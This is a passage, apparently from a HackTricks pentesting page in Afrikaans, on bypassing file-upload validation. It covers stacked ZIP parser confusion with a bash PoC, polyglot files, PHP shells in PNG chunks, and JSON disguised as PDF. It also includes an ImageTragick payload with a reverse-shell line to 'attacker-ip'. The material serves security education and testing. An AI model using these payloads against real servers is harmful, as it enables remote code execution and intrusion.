Aaneenvoeging van twee geldige ZIP files produseer 'n blob waar verskillende parsers op verskillende EOCD records fokus. Baie tools lokaliseer die laaste End Of Central Directory (EOCD), terwyl sommige libraries (e.g., ZipArchive in spesifieke workflows) dalk die eerste archive wat hulle kry, parse. As validation die eerste archive enumereer en extraction 'n ander tool gebruik wat die laaste EOCD eer, kan 'n skadelose archive die kontroles deurstaan terwyl 'n kwaadwillige een uitgehaal en uitgepak word.

PoC:
```bash
# Build two separate archives
printf test > t1; printf test2 > t2
zip zip1.zip t1; zip zip2.zip t2

# Stack them
cat zip1.zip zip2.zip > combo.zip

# Different views
unzip -l combo.zip   # warns about extra bytes; often lists entries from the last archive
php -r '$z=new ZipArchive; $z->open("combo.zip"); for($i=0;$i<$z->numFiles;$i++) echo $z->getNameIndex($i),"\n";'
```
Misbruikpatroon
- Skep 'n onskadelike argief (toegelate tipe, bv. 'n PDF) en 'n tweede argief wat 'n geblokkeerde extensie bevat (bv. `shell.php`).
- Kombineer hulle: `cat benign.zip evil.zip > combined.zip`.
- As die bediener valideer met een parser (sien benign.zip) maar ekstraheer met 'n ander (verwerk evil.zip), beland die geblokkeerde lêer in die uitpakpad.

## ImageTragic

Laai hierdie inhoud op met 'n beeld-ekstensie om die kwesbaarheid uit te buit **(ImageMagick , 7.0.1-1)** (volgens die [exploit](https://www.exploit-db.com/exploits/39767))
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
pop graphic-context
```
## Insluiting van PHP Shell in PNG

Die insluiting van 'n PHP shell in die IDAT chunk van 'n PNG-lêer kan effektief sekere beeldverwerkingsoperasies omseil. Die funksies `imagecopyresized` en `imagecopyresampled` van PHP-GD is besonder relevant in hierdie konteks, aangesien hulle algemeen gebruik word vir respektiewelik resizing en resampling van beelde. Die vermoë van die ingeslote PHP shell om onaangeraak te bly deur hierdie operasies is 'n beduidende voordeel vir sekere gebruiksgevalle.

'n Gedetaileerde ondersoek van hierdie tegniek, insluitend die metodologie en potensiële toepassings, word in die volgende artikel verskaf: ["Encoding Web Shells in PNG IDAT chunks"](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/). Hierdie bron bied 'n omvattende begrip van die proses en die implikasies daarvan.

More information in: [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)

## Polyglot-lêers

Polyglot-lêers dien as 'n unieke hulpmiddel in cybersecurity, en tree op soos kameleonne wat geldig in meerdere lêerformate terselfdertyd kan bestaan. 'n Intrigerende voorbeeld is 'n [GIFAR](https://en.wikipedia.org/wiki/Gifar), 'n hibriede wat beide as 'n GIF en 'n RAR-argief funksioneer. Sulke lêers is nie beperk tot hierdie kombinasie nie; kombinasies soos GIF en JS of PPT en JS is ook uitvoerbaar.

Die kernnut van polyglot-lêers lê in hul vermoë om sekuriteitsmaatreëls te omseil wat lêers op grond van tipe skerm. Algemeen praktyk in verskeie toepassings behels die toelaat van slegs sekere lêertipes vir upload—soos JPEG, GIF, of DOC—om die risiko wat potensieel skadelike formate (bv. JS, PHP, of Phar lêers) inhou, te beperk. 'n Polyglot, deur aan die strukturele kriteria van meerdere lêertipes te voldoen, kan egter stilweg hierdie beperkings omseil.

Ten spyte van hul aanpasbaarheid, stuit polyglots op beperkings. Byvoorbeeld, terwyl 'n polyglot terselfdertyd 'n PHAR-lêer (PHp ARchive) en 'n JPEG kan beliggaam, kan die sukses van die upload afhanklik wees van die platform se beleid oor lêernaam-uitbreidings. As die stelsel strikt is oor toelaatbare uitbreidings, mag die bloot strukturele dualiteit van 'n polyglot nie voldoende wees om die upload te waarborg nie.

More information in: [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)

### Laai geldige JSON-lêers op asof dit 'n PDF is

Hoe om lêertipe-detektering te omseil deur 'n geldige JSON-lêer op te laai, selfs as dit nie toegelaat word nie, deur 'n PDF-lêer voor te gee (tegnieke uit **[this blog post](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)**):

- **`mmmagic` library**: So lank as die `%PDF` magic bytes in die eerste 1024 bytes is, is dit geldig (kyk voorbeeld in die pos)
- **`pdflib` library**: Voeg 'n vals PDF-formaat binne 'n veld van die JSON in sodat die biblioteek dink dit is 'n pdf (kyk voorbeeld in die pos)
- **`file` binary**: Dit kan tot 1048576 bytes van 'n lêer lees. Skep net 'n JSON groter as dit sodat dit die inhoud nie as 'n json kan parse nie en plaas dan binne die JSON die aanvanklike deel van 'n werklike PDF en dit sal dink dit is 'n PDF

## References

- [When Audits Fail: Four Critical Pre-Auth Vulnerabilities in TRUfusion Enterprise](https://www.rcesecurity.com/2025/09/when-audits-fail-four-critical-pre-auth-vulnerabilities-in-trufusion-enterprise/)

- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files)
- [https://github.com/modzero/mod0BurpUploadScanner](https://github.com/modzero/mod0BurpUploadScanner)
- [https://github.com/almandin/fuxploider](https://github.com/almandin/fuxploider)
- [https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html)
- [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)
- [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)
- [https://blog.doyensec.com/2025/01/09/cspt-file-upload.html](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)
- [usd HeroLab – Gibbon LMS arbitrary file write (CVE-2023-45878)](https://herolab.usd.de/security-advisories/usd-2023-0025/)
- [NVD – CVE-2023-45878](https://nvd.nist.gov/vuln/detail/CVE-2023-45878)
- [0xdf – HTB: TheFrizz](https://0xdf.gitlab.io/2025/08/23/htb-thefrizz.html)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)
- [CVE-2024-21546 – NVD entry](https://nvd.nist.gov/vuln/detail/CVE-2024-21546)
- [PoC gist for LFM .php. bypass](https://gist.github.com/ImHades101/338a06816ef97262ba632af9c78b78ca)
- [0xdf – HTB Environment (UniSharp LFM upload → PHP RCE)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [Microsoft – mklink (command reference)](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [0xdf – HTB: Certificate (ZIP NUL-name and stacked ZIP parser confusion → PHP RCE)](https://0xdf.gitlab.io/2025/10/04/htb-certificate.html)

{{#include ../../banners/hacktricks-training.md}}
